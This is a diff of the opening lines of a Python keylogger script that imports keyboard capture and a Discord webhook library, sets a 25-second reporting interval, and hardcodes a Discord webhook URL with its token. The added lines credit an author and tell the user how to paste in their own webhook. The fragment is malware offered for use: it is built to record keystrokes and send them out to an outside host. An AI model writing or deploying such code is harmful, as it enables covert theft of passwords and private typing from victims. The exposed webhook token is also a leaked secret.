@@ -1,3 +1,4 @@
+# Script Made & Checked by jsxtra
 # Execute on python using the command python keylogger.py 
 import keyboard,os
 from threading import Timer
@@ -6,7 +7,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 
 SEND_REPORT_EVERY = 25
 WEBHOOK = "https://discord.com/api/webhooks/1340913549140168754/aAwKjO8ybY-noUZy8rFUTbaQ1Lw5AwX7lLYeCLyYvSbVv1lebdihcfUyss40k_gs7LVS"
-
+# Put your discord bot's webhook. (Integrations -> Webhooks -> Copy Webhook URL)
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
         now = datetime.now()
